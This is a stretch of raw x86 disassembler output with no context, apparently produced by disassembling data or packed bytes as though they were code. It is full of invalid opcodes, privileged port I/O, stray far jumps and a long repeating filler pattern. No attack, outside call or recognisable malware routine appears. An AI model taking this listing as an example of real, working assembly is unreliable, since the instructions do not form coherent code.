  44cc2c:	jmp    0x44cc1e
  44cc2e:	pop    edi
  44cc2f:	dec    ebx
  44cc30:	in     al,0x30
  44cc32:	rol    esi,0xfc
  44cc35:	jge    0x44cc0a
  44cc37:	add    esp,0x40d415e
  44cc3d:	and    bl,cl
  44cc3f:	lahf   
  44cc40:	sbb    BYTE PTR [ebx+0x4a50011c],dh
  44cc46:	pop    ds
  44cc47:	cli    
  44cc48:	call   DWORD PTR [ebp+0x57]
  44cc4b:	mov    esp,0xd51cdb08
  44cc50:	add    DWORD PTR [edi+0x6244afed],0xffffffd9
  44cc57:	imul   ecx,DWORD PTR [edx],0xffffffe9
  44cc5a:	in     al,0x4
  44cc5c:	mov    cl,0xa6
  44cc5e:	(bad)  [edi-0x1]
  44cc61:	(bad)  
  44cc62:	mov    ch,0x81
  44cc64:	cmp    eax,0x3c887600
  44cc69:	add    BYTE PTR [edx+0x4c],ah
  44cc6c:	adc    eax,0x141a26a
  44cc71:	xor    BYTE PTR [edx-0x27],ah
  44cc74:	mov    DWORD PTR [ebp-0x2],edx
  44cc77:	daa    
  44cc78:	mov    al,BYTE PTR [ebp+0x2]
  44cc7b:	pop    edi
  44cc7c:	dec    eax
  44cc7d:	xor    al,0x93
  44cc7f:	ror    BYTE PTR [ebx-0x10],cl
  44cc82:	ror    ebp,0xb0
  44cc85:	inc    esp
  44cc86:	bound  edi,QWORD PTR [esi+0x41226a0b]
  44cc8c:	add    DWORD PTR [eax],esi
  44cc8e:	(bad)  
  44cc8f:	(bad)  [ecx+0x6b27c655]
  44cc95:	add    BYTE PTR [ebp-0x515c0ed4],bh
  44cc9b:	mov    DWORD PTR [eax+eax*1],edi
  44cc9e:	loope  0x44ccb4
  44cca0:	in     eax,dx
  44cca1:	mov    al,0x1e
  44cca3:	fld    DWORD PTR [eax]
  44cca5:	jne    0x44cd1e
  44cca7:	aas    
  44cca8:	inc    ecx
  44cca9:	push   0x10962
  44ccae:	fstp   DWORD PTR [esi*8-0xa2707b0]
  44ccb5:	push   ebp
  44ccb6:	jb     0x44cd2e
  44ccb8:	in     al,dx
  44ccb9:	mov    al,0x1e
  44ccbb:	(bad)  [ecx+0x4360864d]
  44ccc1:	fcomp  st(1)
  44ccc3:	sub    al,0xd9
  44ccc5:	mov    esp,DWORD PTR [edi+0x4201b1]
  44cccb:	xchg   esi,eax
  44cccc:	pusha  
  44cccd:	cmp    esp,eax
  44cccf:	fldenv [ebx]
  44ccd1:	loope  0x44cc5e
  44ccd3:	mov    bl,0x29
  44ccd5:	push   ebx
  44ccd6:	mov    esp,DWORD PTR [edi+0x678b50bd]
  44ccdc:	int    0xb0
  44ccde:	inc    esp
  44ccdf:	bound  ebp,QWORD PTR [eax]
  44cce1:	jmp    0xf616f437
  44cce6:	and    DWORD PTR [esi],0xffffffe5
  44cce9:	mov    DWORD PTR [ebp+0x2],edx
  44ccec:	push   esi
  44cced:	mov    edx,0xd962a4
  44ccf2:	add    BYTE PTR [esi+0x2458a10],cl
  44ccf8:	pop    esi
  44ccf9:	inc    ebx
  44ccfa:	fsub   DWORD PTR [ecx+0x61]
  44ccfd:	mov    al,ds:0x87d96200
  44cd02:	dec    ebp
  44cd03:	neg    BYTE PTR [ebp+0x4b]
  44cd06:	loopne 0x44cd0b
  44cd08:	int    0xb0
  44cd0a:	inc    esp
  44cd0b:	(bad)  
  44cd0c:	inc    BYTE PTR [edx+0x34]
  44cd0f:	add    ecx,edi
  44cd11:	scas   eax,DWORD PTR es:[edi]
  44cd12:	inc    esp
  44cd13:	bound  ebx,QWORD PTR [esi+0x3]
  44cd16:	and    bl,dh
  44cd18:	sbb    al,0x1
  44cd1a:	push   ecx
  44cd1b:	jmp    0x26f5ba0b
  44cd20:	fst    DWORD PTR [edx-0x75]
  44cd23:	pop    ds
  44cd24:	lds    edx,FWORD PTR [eax-0x18]
  44cd27:	pop    esi
  44cd28:	into   
  44cd29:	cmc    
  44cd2a:	jmp    ecx
  44cd2c:	pushf  
  44cd2d:	add    al,0x8b
  44cd2f:	add    BYTE PTR [edi],bl
  44cd31:	mov    ecx,0x888e1589
  44cd36:	cmp    al,0x0
  44cd38:	popa   
  44cd39:	sub    BYTE PTR [ecx],ch
  44cd3b:	mov    DWORD PTR [edi+0x9],ecx
  44cd3e:	mov    al,0x44
  44cd40:	bound  edx,QWORD PTR [esi+0x33]
  44cd43:	adc    al,0xb3
  44cd45:	sbb    al,0x1
  44cd47:	add    bh,dl
  44cd49:	std    
  44cd4a:	lahf   
  44cd4b:	hlt    
  44cd4c:	adc    dl,BYTE PTR [esi]
  44cd4e:	add    DWORD PTR [eax-0x27],edx
  44cd51:	fidiv  WORD PTR [eax]
  44cd53:	mov    cl,0x9e
  44cd55:	(bad)  [edi-0x75]
  44cd58:	push   edi
  44cd59:	(bad)  [edi-0x16d49dbc]
  44cd5f:	xor    eax,0x83f5d12f
  44cd64:	push   ds
  44cd65:	ficomp WORD PTR [edi+0x115d2f4]
  44cd6b:	push   eax
  44cd6c:	or     bl,cl
  44cd6e:	cli    
  44cd6f:	dec    DWORD PTR ds:0xf904bc5d
  44cd75:	cmp    DWORD PTR [ecx+0x24],ebp
  44cd78:	sbb    WORD PTR [ecx],ax
  44cd7b:	mov    esp,DWORD PTR [edi-0xf]
  44cd7e:	scas   eax,DWORD PTR es:[edi]
  44cd7f:	inc    esp
  44cd80:	bound  ebp,QWORD PTR [edx]
  44cd82:	jmp    0xf615b598
  44cd87:	and    DWORD PTR [esi-0x51ba781f],0x64
  44cd8e:	or     esi,esp
  44cd90:	adc    dl,BYTE PTR [esi]
  44cd92:	add    DWORD PTR [edx+0x0],edx
  44cd95:	fst    DWORD PTR [esi]
  44cd97:	loope  0x44cd24
  44cd99:	outs   dx,DWORD PTR ds:[esi]
  44cd9a:	lds    esi,FWORD PTR [eax+0x48dc6244]
  44cda0:	sub    BYTE PTR [ebx],dl
  44cda2:	or     ecx,DWORD PTR fs:[ebx+esi*8]
  44cda6:	adc    eax,0xc48a5201
  44cdab:	hlt    
  44cdac:	call   DWORD PTR [ebp-0x3cf343a4]
  44cdb2:	(bad)  [edi-0x5f299dbc]
  44cdb8:	scas   al,BYTE PTR es:[edi]
  44cdb9:	fldenvw [ecx+0x115b338]
  44cdc0:	lea    ebx,[edi]
  44cdc2:	ror    DWORD PTR [edi+0x6a],1
  44cdc5:	and    al,BYTE PTR [ebx-0x1]
  44cdc8:	mov    dh,BYTE PTR [edi+0x11]
  44cdcb:	mov    al,0x44
  44cdcd:	bound  ebp,QWORD PTR [ebx]
  44cdcf:	not    BYTE PTR [ebp+0x36]
  44cdd2:	shl    DWORD PTR [edx-0x472fba04],0x1
  44cdd9:	(bad)  
  44cdda:	fld    DWORD PTR [eax]
  44cddc:	mov    edi,DWORD PTR [edi]
  44cdde:	cs ret 
  44cde0:	add    al,0x62
  44cde2:	popf   
  44cde3:	(bad)  
  44cde4:	int3   
  44cde5:	push   ss
  44cde6:	popf   
  44cde7:	(bad)  
  44cde8:	int3   
  44cde9:	mov    bh,0x64
  44cdeb:	in     al,0x8b
  44cded:	lahf   
  44cdee:	loope  0x44cd79
  44cdf0:	inc    eax
  44cdf1:	push   cs
  44cdf2:	cs ret 0x16cc
  44cdf6:	popf   
  44cdf7:	(bad)  
  44cdf8:	int3   
  44cdf9:	add    BYTE PTR [edi-0x73ac1b9c],dl
  44cdff:	sub    BYTE PTR [edx+0x3c8a623d],cl
  44ce05:	add    cl,bl
  44ce07:	in     eax,dx
  44ce08:	or     BYTE PTR [ecx+0x3589d926],dh
  44ce0e:	fimul  DWORD PTR [eax+0x2f2d003c]
  44ce14:	pop    edx
  44ce15:	pop    ebp
  44ce16:	mov    eax,ds:0x17ccc49c
  44ce1b:	fs in  al,0x51
  44ce1e:	dec    edx
  44ce1f:	add    eax,0x7a623ffd
  44ce24:	sbb    BYTE PTR [ecx-0x17af26e2],dh
  44ce2a:	push   cs
  44ce2b:	shl    ch,cl
  44ce2d:	jmp    ecx
  44ce2f:	xchg   esp,eax
  44ce30:	or     BYTE PTR [ecx+0x4d89cd27],cl
  44ce36:	pop    edx
  44ce37:	sub    ch,BYTE PTR [ebx+0x0]
  44ce3a:	jmp    0x1ef5fb24
  44ce3f:	fst    DWORD PTR [edx-0x1]
  44ce42:	pop    ss
  44ce43:	int    0x89
  44ce45:	in     eax,0x7
  44ce47:	pushf  
  44ce48:	(bad)  
  44ce49:	int3   
  44ce4a:	mov    bh,0x62
  44ce4c:	in     al,0x83
  44ce4e:	inc    esi
  44ce4f:	idiv   BYTE PTR [ebp+0xda4a45]
  44ce55:	add    BYTE PTR [edx-0x6a],ah
  44ce58:	cmp    ebx,esp
  44ce5a:	mov    edx,0xd9
  44ce5f:	sbb    eax,0x6201ed15
  44ce64:	fld    DWORD PTR [eax]
  44ce66:	(bad)  
  44ce67:	lahf   
  44ce68:	int    0x0
  44ce6a:	add    BYTE PTR [edx-0x27],ah
  44ce6d:	mov    ebp,0xd9fe45
  44ce72:	add    BYTE PTR [edx+0x62],ah
  44ce75:	inc    ebx
  44ce76:	or     bl,bl
  44ce78:	fadd   QWORD PTR [ecx+esi*4]
  44ce7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44ce7c:	fld1   
  44ce7e:	imul   edi,edx,0x5ea1f5ce
  44ce84:	mov    BYTE PTR [eax+eax*1],bh
  44ce87:	aas    
  44ce88:	into   
  44ce89:	cmc    
  44ce8a:	add    BYTE PTR [edx+0x45],ah
  44ce8d:	add    eax,0xafe55fc7
  44ce92:	inc    esp
  44ce93:	(bad)  
  44ce94:	fld    DWORD PTR [eax]
  44ce96:	add    BYTE PTR [edx-0x3e],ah
  44ce99:	or     al,bh
  44ce9b:	addr16 in eax,0xaf
  44ce9e:	inc    esp
  44ce9f:	(bad)  
  44cea0:	fadd   DWORD PTR [eax]
  44cea2:	add    BYTE PTR [edx+0x5a],ah
  44cea5:	xor    ecx,DWORD PTR [ebx+esi*8]
  44cea8:	adc    eax,0xe3170001
  44cead:	mov    ebp,0x3c886e05
  44ceb2:	add    BYTE PTR [edx-0x27],ah
  44ceb5:	add    BYTE PTR [eax],al
  44ceb7:	loope  0x44cec5
  44ceb9:	or     eax,0xd926b1
  44cebe:	jne    0x44cf27
  44cec0:	inc    ebx
  44cec1:	add    edi,edi
  44cec3:	add    BYTE PTR [edi-0x47],dl
  44cec6:	mov    al,0x44
  44cec8:	bound  edi,QWORD PTR [edx+0x4]
  44cecb:	mov    cl,0xa6
  44cecd:	(bad)  [ecx+0x3c88660d]
  44ced3:	add    bl,bl
  44ced5:	sbb    ebp,ecx
  44ced7:	mov    ebp,DWORD PTR [edi-0x23]
  44ceda:	scas   eax,DWORD PTR es:[edi]
  44cedb:	inc    esp
  44cedc:	bound  esp,QWORD PTR [edx+0x3b]
  44cedf:	call   0x8979ea45
  44cee4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44cee5:	ror    DWORD PTR [ecx+0x3603a4d],0xfc
  44ceec:	rcl    BYTE PTR [ecx+eax*1],cl
  44ceef:	push   0x40d5a2
  44cef4:	or     eax,0x9eb0e0e4
  44cef9:	fldenv [ecx+0x114b318]
  44ceff:	(bad)  
  44cf00:	pop    edi
  44cf01:	add    DWORD PTR [eax-0x2cb9dbc],esi
  44cf07:	aas    
  44cf08:	bound  eax,QWORD PTR [ecx+0x51]
  44cf0b:	add    al,0x22
  44cf0d:	(bad)  [ecx+0x3c887a15]
  44cf13:	add    BYTE PTR [eax],dh
  44cf15:	rol    DWORD PTR [edx-0x7e323a08],0xc4
  44cf1c:	push   0x7a
  44cf1e:	sbb    al,0xb1
  44cf20:	push   ds
  44cf21:	fprem1 
  44cf23:	adc    eax,0x3c8886
  44cf28:	add    BYTE PTR [ecx],al
  44cf2a:	add    eax,0x786244b0
  44cf2f:	sub    BYTE PTR [ecx-0x17af26e2],dh
  44cf35:	(bad)  
  44cf36:	into   
  44cf37:	cmc    
  44cf38:	jmp    ecx
  44cf3a:	xchg   esp,eax
  44cf3b:	cld    
  44cf3c:	mov    BYTE PTR [edi],ah
  44cf3e:	leave  
  44cf3f:	mov    DWORD PTR [ebp+0x72],ecx
  44cf42:	daa    
  44cf43:	jmp    0xf6123c1d
  44cf48:	sbb    DWORD PTR [esi+0x1310a1d4],0x16
  44cf4f:	add    DWORD PTR [ebx+0x6a52c9af],ecx
  44cf55:	bound  edi,QWORD PTR [edx+0x10]
  44cf58:	mov    cl,0x9e
  44cf5a:	fst    DWORD PTR [eax-0x18]
  44cf5d:	sahf   
  44cf5e:	shl    ebp,1
  44cf60:	jmp    ecx
  44cf62:	xchg   ebp,eax
  44cf63:	add    al,0x8b
  44cf65:	lahf   
  44cf66:	leave  
  44cf67:	xchg   DWORD PTR [ebp+0x42],ecx
  44cf6a:	popa   
  44cf6b:	dec    ebx
  44cf6c:	cld    
  44cf6d:	pop    ecx
  44cf6e:	es icebp 
  44cf70:	jae    0x44cf2a
  44cf72:	pusha  
  44cf73:	cmp    esp,eax
  44cf75:	mov    dl,0x60
  44cf77:	inc    ebx
  44cf78:	fdiv   QWORD PTR [ebx-0x204593f]
  44cf7e:	int3   
  44cf7f:	add    esp,0xb114786a
  44cf85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44cf86:	(bad)  [ecx+0x3c8a4615]
  44cf8c:	add    BYTE PTR [eax],al
  44cf8e:	xor    BYTE PTR [edx+0x28],bh
  44cf91:	mov    cl,0x1e
  44cf93:	fld    DWORD PTR [ecx]
  44cf95:	inc    ebp
  44cf96:	(bad)  
  44cf97:	sub    DWORD PTR [edx+0x3c8a720d],ecx
  44cf9d:	add    BYTE PTR [ecx+0x1e],ah
  44cfa0:	cmc    
  44cfa1:	push   ecx
  44cfa2:	retf   0xfa64
  44cfa5:	jmp    FWORD PTR [ebp-0x26f343a8]
  44cfab:	es in  eax,dx
  44cfad:	add    esi,DWORD PTR [edi]
  44cfaf:	lods   eax,DWORD PTR ds:[esi]
  44cfb0:	add    DWORD PTR [ebp+0x7e],edx
  44cfb3:	bound  ecx,QWORD PTR [ebx-0x1c]
  44cfb6:	fst    DWORD PTR [esi]
  44cfb8:	cmc    
  44cfb9:	add    ebx,DWORD PTR [edi]
  44cfbb:	lods   eax,DWORD PTR ds:[esi]
  44cfbc:	xchg   DWORD PTR [ebp+0x7e],eax
  44cfbf:	pusha  
  44cfc0:	inc    ebx
  44cfc1:	loopne 0x44d00c
  44cfc3:	ficom  WORD PTR [ecx+esi*4]
  44cfc6:	fld    DWORD PTR es:[edi-0x693f7db3]
  44cfcd:	(bad)  
  44cfce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44cfcf:	rol    DWORD PTR [eax],1
  44cfd1:	add    BYTE PTR [edx-0x27],ah
  44cfd4:	jmp    0xf96aa8e2
  44cfd9:	and    DWORD PTR [eax],0xffffffd5
  44cfdc:	xchg   DWORD PTR [ebp+0x3a],edx
  44cfdf:	pusha  
  44cfe0:	cmp    edi,eax
  44cfe2:	jns    0x44cffa
  44cfe4:	icebp  
  44cfe5:	jae    0x44d051
  44cfe7:	pusha  
  44cfe8:	add    edx,DWORD PTR [eax]
  44cfea:	repz adc al,0x1
  44cfed:	add    ebp,DWORD PTR [edi+0x1189d1]
  44cff3:	popa   
  44cff4:	es stc 
  44cff6:	mov    eax,ds:0x3c8a72
  44cffb:	popa   
  44cffc:	push   ss
  44cffd:	stc    
  44cffe:	mov    DWORD PTR [edx+0x60],edx
  44d001:	inc    ebx
  44d002:	clc    
  44d003:	jecxz  0x44cf9e
  44d005:	out    0x3,eax
  44d007:	(bad)  
  44d008:	(bad)  [ecx+0x3c8a5215]
  44d00e:	add    BYTE PTR [ecx+0x26],ah
  44d011:	stc    
  44d012:	xor    ebp,DWORD PTR [eax+0x7a]
  44d015:	adc    BYTE PTR [ecx+0x4501d926],dh
  44d01b:	retf   0x861
  44d01e:	jmp    0x44d015
  44d020:	popa   
  44d021:	and    eax,DWORD PTR [ebx+esi*8]
  44d024:	adc    al,0x1
  44d026:	mov    DWORD PTR [edi-0x27],ebp
  44d029:	scas   eax,DWORD PTR es:[edi]
  44d02a:	inc    esp
  44d02b:	bound  ecx,QWORD PTR [eax]
  44d02d:	enter  0x5789,0xd1
  44d031:	mov    al,0x44
  44d033:	bound  ecx,QWORD PTR [eax]
  44d035:	enter  0x6f89,0xe1
  44d039:	scas   eax,DWORD PTR es:[edi]
  44d03a:	inc    esp
  44d03b:	(bad)
  44d040:	retf   
  44d041:	mov    DWORD PTR ds:0x3c8a52,ecx
  44d047:	adc    eax,ecx
  44d049:	add    bh,bl
  44d04b:	gs retf 
  44d04d:	jnp    0x44d00f
  44d04f:	xlat   BYTE PTR ds:[ebx]
  44d050:	aad    0x31
  44d052:	ror    BYTE PTR [ecx+0x0],0x8a
  44d056:	and    eax,0x3c886600
  44d05b:	add    cl,ah
  44d05d:	xchg   ebp,eax
  44d05e:	cld    
  44d05f:	cmp    BYTE PTR [edi-0x1b],0xaf
  44d063:	inc    esp
  44d064:	(bad)  
  44d065:	fldcw  WORD PTR [ecx+ecx*1+0x3]
  44d069:	(bad)  
  44d06a:	mov    al,0x44
  44d06c:	bound  esp,QWORD PTR [eax+0x3c]
  44d06f:	and    al,0x66
  44d071:	ror    DWORD PTR [edx-0x7634ea03],0x15
  44d078:	push   edx
  44d079:	mov    BYTE PTR [eax+eax*1],bh
  44d07c:	mov    al,0x96
  44d07e:	xor    eax,eax
  44d080:	jmp    0x63082439
  44d085:	fld    DWORD PTR [eax]
  44d087:	add    BYTE PTR [edx-0x27],ah
  44d08a:	add    BYTE PTR [eax],al
  44d08c:	(bad)  
  44d08d:	fld    DWORD PTR [eax]
  44d08f:	add    BYTE PTR [edx-0x27],ah
  44d092:	add    BYTE PTR [eax],al
  44d094:	(bad)  
  44d095:	fld    DWORD PTR [eax]
  44d097:	add    BYTE PTR [edx-0x27],ah
  44d09a:	add    BYTE PTR [eax],al
  44d09c:	(bad)  
  44d09d:	fld    DWORD PTR [eax]
  44d09f:	add    BYTE PTR [edx-0x27],ah
  44d0a2:	add    BYTE PTR [eax],al
  44d0a4:	(bad)  
  44d0a5:	fld    DWORD PTR [eax]
  44d0a7:	add    BYTE PTR [edx-0x27],ah
  44d0aa:	add    BYTE PTR [eax],al
  44d0ac:	(bad)  
  44d0ad:	fld    DWORD PTR [eax]
  44d0af:	add    BYTE PTR [edx-0x27],ah
  44d0b2:	add    BYTE PTR [eax],al
  44d0b4:	(bad)  
  44d0b5:	fld    DWORD PTR [eax]
  44d0b7:	add    BYTE PTR [edx-0x27],ah
  44d0ba:	add    BYTE PTR [eax],al
  44d0bc:	add    BYTE PTR [edx-0x27],ah
  44d0bf:	add    BYTE PTR [eax],al
  44d0c1:	(bad)  
  44d0c2:	fld    DWORD PTR [eax]
  44d0c4:	add    BYTE PTR [edx-0x27],ah
  44d0c7:	add    BYTE PTR [eax],al
  44d0c9:	(bad)  
  44d0ca:	fld    DWORD PTR [eax]
  44d0cc:	add    BYTE PTR [edx-0x27],ah
  44d0cf:	add    BYTE PTR [eax],al
  44d0d1:	(bad)  
  44d0d2:	fld    DWORD PTR [eax]
  44d0d4:	add    BYTE PTR [edx-0x27],ah
  44d0d7:	add    BYTE PTR [eax],al
  44d0d9:	(bad)  
  44d0da:	fld    DWORD PTR [eax]
  44d0dc:	add    BYTE PTR [edx-0x27],ah
  44d0df:	add    BYTE PTR [eax],al
  44d0e1:	(bad)  
  44d0e2:	fld    DWORD PTR [eax]
  44d0e4:	add    BYTE PTR [edx-0x27],ah
  44d0e7:	add    BYTE PTR [eax],al
  44d0e9:	(bad)  
  44d0ea:	fld    DWORD PTR [eax]
  44d0ec:	add    BYTE PTR [edx-0x27],ah
  44d0ef:	add    BYTE PTR [eax],al
  44d0f1:	(bad)  
  44d0f2:	fld    DWORD PTR [eax]
  44d0f4:	add    BYTE PTR [edx-0x27],ah
  44d0f7:	add    BYTE PTR [eax],al
  44d0f9:	(bad)  
  44d0fa:	fld    DWORD PTR [eax]
  44d0fc:	add    BYTE PTR [edx-0x27],ah
  44d0ff:	add    BYTE PTR [eax],al
  44d101:	(bad)  
  44d102:	fld    DWORD PTR [eax]
  44d104:	add    BYTE PTR [edx-0x27],ah
  44d107:	add    BYTE PTR [eax],al
  44d109:	(bad)  
  44d10a:	fld    DWORD PTR [eax]
  44d10c:	add    BYTE PTR [edx-0x27],ah
  44d10f:	add    BYTE PTR [eax],al
  44d111:	(bad)  
  44d112:	fld    DWORD PTR [eax]
  44d114:	add    BYTE PTR [edx-0x27],ah
  44d117:	add    BYTE PTR [eax],al
  44d119:	(bad)  
  44d11a:	fld    DWORD PTR [eax]
  44d11c:	add    BYTE PTR [edx-0x27],ah
  44d11f:	add    BYTE PTR [eax],al
  44d121:	add    BYTE PTR [edx-0x27],ah
  44d124:	add    BYTE PTR [eax],al
  44d126:	(bad)  
  44d127:	fld    DWORD PTR [eax]
  44d129:	add    BYTE PTR [edx-0x27],ah
  44d12c:	add    BYTE PTR [eax],al
  44d12e:	(bad)  
  44d12f:	fld    DWORD PTR [eax]
  44d131:	add    BYTE PTR [edx-0x27],ah
  44d134:	add    BYTE PTR [eax],al
  44d136:	(bad)  
  44d137:	fld    DWORD PTR [eax]
  44d139:	add    BYTE PTR [edx-0x27],ah
  44d13c:	add    BYTE PTR [eax],al
  44d13e:	(bad)  
  44d13f:	fld    DWORD PTR [eax]
  44d141:	add    BYTE PTR [edx-0x27],ah
  44d144:	add    BYTE PTR [eax],al
  44d146:	(bad)  
  44d147:	fld    DWORD PTR [eax]
  44d149:	add    BYTE PTR [edx-0x27],ah
  44d14c:	add    BYTE PTR [eax],al
  44d14e:	(bad)  
  44d14f:	fld    DWORD PTR [eax]
  44d151:	add    BYTE PTR [edx-0x27],ah
  44d154:	add    BYTE PTR [eax],al
  44d156:	(bad)  
  44d157:	fld    DWORD PTR [eax]
  44d159:	add    BYTE PTR [edx-0x27],ah
  44d15c:	add    BYTE PTR [eax],al
  44d15e:	(bad)  
  44d15f:	fld    DWORD PTR [eax]
  44d161:	add    BYTE PTR [edx-0x27],ah
  44d164:	add    BYTE PTR [eax],al
  44d166:	(bad)  
  44d167:	fld    DWORD PTR [eax]
  44d169:	add    BYTE PTR [edx-0x27],ah
  44d16c:	add    BYTE PTR [eax],al
  44d16e:	(bad)  
  44d16f:	fld    DWORD PTR [eax]
  44d171:	add    BYTE PTR [edx-0x27],ah
  44d174:	add    BYTE PTR [eax],al
  44d176:	(bad)  
  44d177:	fld    DWORD PTR [eax]
  44d179:	add    BYTE PTR [edx-0x27],ah
  44d17c:	add    BYTE PTR [eax],al
  44d17e:	(bad)  
  44d17f:	fld    DWORD PTR [eax]
  44d181:	add    BYTE PTR [edx-0x27],ah
  44d184:	add    BYTE PTR [eax],al
  44d186:	add    BYTE PTR [edx-0x27],ah
  44d189:	add    BYTE PTR [eax],al
  44d18b:	(bad)  
  44d18c:	fld    DWORD PTR [eax]
  44d18e:	add    BYTE PTR [edx-0x27],ah
  44d191:	add    BYTE PTR [eax],al
  44d193:	(bad)  
  44d194:	fld    DWORD PTR [eax]
  44d196:	add    BYTE PTR [edx-0x27],ah
  44d199:	add    BYTE PTR [eax],al
  44d19b:	(bad)  
  44d19c:	fld    DWORD PTR [eax]
  44d19e:	add    BYTE PTR [edx-0x27],ah
  44d1a1:	add    BYTE PTR [eax],al
  44d1a3:	(bad)  
  44d1a4:	fld    DWORD PTR [eax]
  44d1a6:	add    BYTE PTR [edx-0x27],ah
  44d1a9:	add    BYTE PTR [eax],al
  44d1ab:	(bad)  
  44d1ac:	fld    DWORD PTR [eax]
  44d1ae:	add    BYTE PTR [edx-0x27],ah
  44d1b1:	add    BYTE PTR [eax],al
  44d1b3:	xchg   esp,eax
  44d1b4:	in     eax,0xb1
  44d1b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44d1b7:	imul   ebx,DWORD PTR [ecx-0x5f87b293],0x3e18d9c9
  44d1c1:	outs   dx,BYTE PTR ds:[esi]
  44d1c2:	fs aad 0x57
  44d1c5:	adc    ah,BYTE PTR [edi]
  44d1c7:	push   esi
  44d1c8:	ja     0x44d1d1
  44d1ca:	(bad)
  44d1cd:	popa   
  44d1ce:	mov    al,0x95
  44d1d0:	xor    bl,0xed
  44d1d3:	fbstp  TBYTE PTR [ecx+0x54]
  44d1d6:	psubw  mm3,QWORD PTR [ebx]
  44d1d9:	xor    al,0x63
  44d1db:	in     eax,0x13
  44d1dd:	imul   eax,eax,0x284059d2
  44d1e3:	xchg   BYTE PTR [ecx],dl
  44d1e5:	or     edx,DWORD PTR [edi-0x5161596b]
  44d1eb:	xor    esp,ebx
  44d1ed:	mov    bh,0x39
  44d1ef:	repnz adc eax,0xcf69868
  44d1f5:	inc    esp
  44d1f6:	mov    al,0x9
  44d1f8:	shl    bh,1
  44d1fa:	dec    esi
  44d1fb:	sbb    eax,0x98960504
  44d200:	pop    edx
  44d201:	adc    DWORD PTR [ecx+0xe],0xffffffe5
  44d205:	dec    ebp
  44d206:	test   BYTE PTR [ebx],al
  44d208:	outs   dx,BYTE PTR ds:[esi]
  44d209:	mov    al,ds:0x35288b1d
  44d20e:	das    
  44d20f:	pop    ss
  44d210:	aad    0x8f
  44d212:	add    al,0xfb
  44d214:	add    BYTE PTR [edx-0x8f56653],dl
  44d21a:	popa   
  44d21b:	pop    ebx
  44d21c:	and    ebp,esi
  44d21e:	mov    ecx,es
  44d220:	repz dec eax
  44d222:	add    ebp,DWORD PTR [edx]
  44d224:	push   0x62ef1e85
  44d229:	cmc    
  44d22a:	sahf   
  44d22b:	lock push ds
  44d22d:	cmp    BYTE PTR [edi+eiz*4],cl
  44d230:	mov    dh,BYTE PTR [esi-0x2]
  44d233:	loopne 0x44d2b2
  44d235:	adc    dl,al
  44d237:	out    dx,al
  44d238:	mov    al,0x53
  44d23a:	es adc eax,0x1a315eb6
  44d240:	jnp    0x44d276
  44d242:	rcl    ah,0xf3
  44d245:	call   0x5052c3ec
  44d24a:	jecxz  0x44d2b0
  44d24c:	xchg   edi,eax
  44d24d:	call   0x7e1f0528
  44d252:	xor    ah,0xb2
  44d255:	js     0x44d29a
  44d257:	and    ebp,0x10
  44d25a:	call   0xaf14:0x7849d23e
  44d261:	jmp    0x769f4baa
  44d266:	pop    es
  44d267:	xchg   esi,eax
  44d268:	or     eax,0xdfd77806
  44d26d:	mov    ebx,0x9172cd72
  44d272:	and    dl,ah
  44d274:	iret   
  44d275:	dec    edi
  44d276:	sub    esi,DWORD PTR [esi-0x3b22122b]
  44d27c:	(bad)
  44d27f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44d280:	(bad)  
  44d281:	dec    esi
  44d282:	sub    bh,ch
  44d284:	scas   al,BYTE PTR es:[edi]
  44d285:	mov    ah,BYTE PTR [edi+0xa]
  44d288:	js     0x44d302
  44d28a:	or     BYTE PTR [ebp-0x17],cl
  44d28d:	imul   ebx,DWORD PTR [ecx-0x5f],0xf3617986
  44d294:	retf   
  44d295:	fild   DWORD PTR [edi]
  44d297:	push   ecx
  44d298:	sub    eax,0x3c835213
  44d29d:	jne    0x44d31e
  44d29f:	in     eax,0x93
  44d2a1:	(bad)  
  44d2a2:	jae    0x44d2b7
  44d2a4:	add    DWORD PTR [ebx+ebx*1-0x4065c786],ebp
  44d2ab:	and    al,0x1c
  44d2ad:	push   ebx
  44d2ae:	mov    ebp,0x5f8c0ebf
  44d2b3:	jnp    0x44d31e
  44d2b5:	aas    
  44d2b6:	jno    0x44d2c1
  44d2b8:	pushf  
  44d2b9:	enter  0x2ff1,0xaf
  44d2bd:	(bad)  
  44d2be:	stc    
  44d2bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44d2c0:	mov    ch,0xf
  44d2c2:	cmp    al,0x54
  44d2c4:	scas   eax,DWORD PTR es:[edi]
  44d2c5:	mov    ecx,eax
  44d2c7:	in     al,0xe1
  44d2c9:	push   ds
  44d2ca:	add    BYTE PTR [edi-0x280d2a7],ch
  44d2d0:	mov    dl,0x9a
  44d2d2:	or     BYTE PTR ds:0x9c5f3634,0x82
  44d2d9:	or     eax,0xc278b648
  44d2de:	pop    edx
  44d2df:	jbe    0x44d35c
  44d2e1:	sbb    bl,ah
  44d2e3:	test   DWORD PTR [eax+ecx*8+0x76310a2f],esi
  44d2ea:	repnz add al,0x85
  44d2ed:	add    esp,edi
  44d2ef:	mov    ch,0x17
  44d2f1:	and    edx,esp
  44d2f3:	inc    ebp
  44d2f4:	sbb    bl,BYTE PTR [eax+ebp*1+0xa]
  44d2f8:	and    al,0xb8
  44d2fa:	mov    bl,ch
  44d2fc:	imul   edx,ecx,0xffffffa4
  44d2ff:	not    DWORD PTR [esi-0x28a23922]
  44d305:	fisub  DWORD PTR [edx+0x67]
  44d308:	dec    esp
  44d309:	pop    ecx
  44d30a:	xchg   edi,eax
  44d30b:	add    ah,BYTE PTR [ecx-0x5d576785]
  44d311:	mov    ebx,fs
  44d313:	push   es
  44d314:	xor    DWORD PTR [esi],edx
  44d316:	rcl    DWORD PTR [ecx+0x24d75665],1
  44d31c:	pop    esp
  44d31d:	(bad)  
  44d31e:	dec    ebp
  44d31f:	dec    eax
  44d320:	sti    
  44d321:	dec    eax
  44d322:	inc    ebx
  44d323:	pop    es
  44d324:	jae    0x44d2e4
  44d326:	mov    bl,0xf1
  44d328:	bound  ebp,QWORD PTR [eax+0xbd36d5b]
  44d32e:	fcom   QWORD PTR [ebp-0x7f49d5ef]
  44d334:	std    
  44d335:	xchg   edx,eax
  44d336:	cdq    
  44d337:	sti    
  44d338:	loope  0x44d347
  44d33a:	ja     0x44d364
